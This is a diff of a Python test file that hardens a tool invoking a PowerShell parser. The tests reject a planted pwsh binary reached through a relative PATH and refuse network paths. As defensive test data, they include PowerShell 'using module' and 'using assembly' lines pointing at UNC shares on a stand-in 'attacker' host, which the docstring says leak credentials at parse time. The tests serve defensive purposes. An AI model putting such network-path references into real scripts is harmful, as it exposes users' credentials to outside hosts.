@@ -44,7 +44,9 @@ def _fake_pwsh(
 ) -> list[dict[str, Any]]:
     """Replace pwsh with a fake that records each call and returns a fixed result."""
     calls: list[dict[str, Any]] = []
-    monkeypatch.setattr(shutil, "which", lambda name: "/fake/pwsh" if name == "pwsh" else None)
+    monkeypatch.setattr(
+        shutil, "which", lambda name, path=None: "/fake/pwsh" if name == "pwsh" else None
+    )
 
     def fake_run(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess[str]:
         cwd = Path(kwargs["cwd"])
@@ -201,7 +203,7 @@ def test_missing_pwsh_fails_cli_without_affecting_python(
 ) -> None:
     """AC2: A missing parser fails explicitly and never reports a PowerShell score."""
     monkeypatch.chdir(tmp_path)
-    monkeypatch.setattr(shutil, "which", lambda _name: None)
+    monkeypatch.setattr(shutil, "which", lambda _name, path=None: None)
     script = tmp_path / "Script.ps1"
     script.write_text("Import-Module Pester\n", encoding="utf-8")
     python = tmp_path / "example.py"
@@ -374,3 +376,84 @@ def test_shipped_powershell_counter_runs_from_consumer_directory(
     assert coupling["value"] == 8.0
     assert coupling["confidence"] == 0.6
     assert coupling["reasons"][0] == "2 import/dependency statements"
+
+
+def test_relative_path_entries_never_supply_pwsh(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """CWE-427: a pwsh planted in the checkout and reached by a relative PATH entry never runs."""
+    planted = tmp_path / "bin" / "pwsh"
+    planted.parent.mkdir()
+    planted.write_text("#!/bin/sh\necho planted\n", encoding="utf-8")
+    planted.chmod(0o755)
+    monkeypatch.chdir(tmp_path)
+    monkeypatch.setenv("PATH", "bin")
+
+    with pytest.raises(_mod.PowerShellParserError, match="not on PATH"):
+        assess_content(Path("Script.ps1"), "Import-Module A\n")
+
+
+def test_pwsh_inside_the_scanned_directory_is_refused(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    calls = _fake_pwsh(monkeypatch)
+    monkeypatch.setattr(shutil, "which", lambda _name, path=None: str(tmp_path / "pwsh"))
+    monkeypatch.chdir(tmp_path)
+
+    with pytest.raises(_mod.PowerShellParserError, match="inside the scanned directory"):
+        assess_content(Path("Script.ps1"), "Import-Module A\n")
+
+    assert calls == []
+
+
+def test_windows_requires_pwsh_exe(monkeypatch: pytest.MonkeyPatch) -> None:
+    calls = _fake_pwsh(monkeypatch)
+    monkeypatch.setattr(shutil, "which", lambda _name, path=None: "/opt/pwsh/pwsh.cmd")
+    monkeypatch.setattr(sys, "platform", "win32")
+
+    with pytest.raises(_mod.PowerShellParserError, match="must be pwsh.exe"):
+        assess_content(Path("Script.ps1"), "Import-Module A\n")
+
+    assert calls == []
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        "using module \\\\attacker\\share\\Evil.psm1\n",
+        "using assembly //attacker/share/Evil.dll\n",
+        "using module @{ ModuleName = '\\\\attacker\\share\\Evil.psd1'; ModuleVersion = '1.0' }\n",
+    ],
+)
+def test_windows_refuses_using_with_a_network_path(
+    monkeypatch: pytest.MonkeyPatch, source: str
+) -> None:
+    """CWE-829: PowerShell resolves using targets while parsing; a UNC target leaks credentials."""
+    calls = _fake_pwsh(monkeypatch)
+    monkeypatch.setattr(sys, "platform", "win32")
+
+    with pytest.raises(_mod.PowerShellParserError, match="network path"):
+        assess_content(Path("Script.ps1"), source)
+
+    assert calls == []
+
+
+@pytest.mark.parametrize(
+    ("platform", "source"),
+    [
+        ("win32", "Copy-Item \\\\server\\share\\a.txt .\nImport-Module A\n"),
+        ("win32", "using module ./Local.psm1\nusing namespace System.Text\n"),
+        ("linux", "using module //host/share/Evil.psm1\n"),
+    ],
+)
+def test_network_guard_leaves_other_sources_to_the_parser(
+    monkeypatch: pytest.MonkeyPatch, platform: str, source: str
+) -> None:
+    calls = _fake_pwsh(monkeypatch, stdout='{"count":1,"errors":[]}')
+    monkeypatch.setattr(shutil, "which", lambda _name, path=None: "/fake/pwsh.exe")
+    monkeypatch.setattr(sys, "platform", platform)
+
+    coupling = assess_content(Path("Script.ps1"), source).coupling
+
+    assert coupling.reasons[0] == "1 import/dependency statements"
+    assert len(calls) == 1
